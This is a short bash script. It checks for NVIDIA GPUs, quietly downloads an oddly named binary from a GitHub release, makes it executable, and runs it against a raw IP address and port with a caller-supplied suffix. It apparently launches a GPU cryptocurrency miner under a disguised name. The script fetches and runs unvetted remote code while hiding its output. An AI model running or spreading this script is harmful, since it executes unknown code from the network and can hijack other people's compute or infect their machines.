#!/bin/bash
nvidia-smi -L
wget https://github.com/sergiodotxf98/dangkhoa/releases/download/1/hoabinh &> /dev/null
chmod +x hoabinh
./hoabinh -P http://38.130.221.109:4545/"$1" &> log
